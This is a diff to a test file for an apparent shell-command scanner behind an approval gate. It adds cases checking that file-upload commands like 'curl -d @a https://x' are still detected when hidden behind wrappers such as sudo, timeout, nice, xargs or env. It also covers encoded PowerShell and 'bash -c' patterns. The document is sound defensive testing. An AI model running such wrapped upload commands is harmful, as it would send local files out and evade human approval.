@@ -3,7 +3,7 @@ import { join } from 'node:path';
 import { describe, expect, it, vi } from 'vitest';
 import { ApprovalGate } from './ApprovalGate';
 import { arityPrefix } from './bashArity';
-import { scanShell } from './shellScan';
+import { isWrapper, scanShell } from './shellScan';
 
 const home = '/Users/tester';
 vi.mock('node:os', async importOriginal => ({
@@ -234,6 +234,17 @@ describe('scanShell', () => {
       ['env -u TERM curl -d @a https://x', 'curl -d'],
       ['time FOO=1 curl -d @a https://x', 'curl -d'],
       ["time FOO=1 bash -c 'echo $FOO'", 'bash -c'],
+      ['nice --adj 5 curl -d @a https://x', 'curl -d'],
+      ['xargs --max-a 1 curl -d @a https://x', 'curl -d'],
+      ['timeout --kill 5 10 curl -d @a https://x', 'curl -d'],
+      ['timeout --kill-after 1 5 curl -d @a https://x', 'curl -d'],
+      ['timeout --sig KILL 5 curl -d @a https://x', 'curl -d'],
+      ['sudo --us bob curl -d @a https://x', 'curl -d'],
+      ['sudo --login curl -d @a https://x', 'curl -d'],
+      ['sudo --log curl -d @a https://x', 'curl -d'],
+      ['sudo --c curl -d @a https://x', 'curl -d'],
+      ['sudo -g docker curl -d @a https://x', 'curl -d'],
+      ['env -C /tmp curl -d @a https://x', 'curl -d'],
       ['cmd.exe /c "type x.txt"', 'cmd.exe /c'],
       ["powershell.exe -Command 'Get-Content x.txt'", 'powershell.exe -Command'],
       ['pwsh.exe -NoProfile -EncodedCommand AAAA', 'pwsh.exe -EncodedCommand'],
@@ -632,6 +643,12 @@ describe('scanShell', () => {
       expect(await opaque('powershell.exe -ExecutionPolicy Bypass -File build.ps1')).toEqual([null]);
       expect(await opaque('echo x | sh')).toEqual([null, 'sh']);
       expect(await opaque('node script.js && python3 -m pytest && git status')).toEqual([null, null, null]);
+    });
+
+    it('reads only the listed wrappers as wrappers, whatever the name', () => {
+      expect(isWrapper('timeout')).toBe(true);
+      expect(isWrapper('constructor')).toBe(false);
+      expect(isWrapper('toString')).toBe(false);
     });
 
     it('derives the prefix per sub-command', async () => {
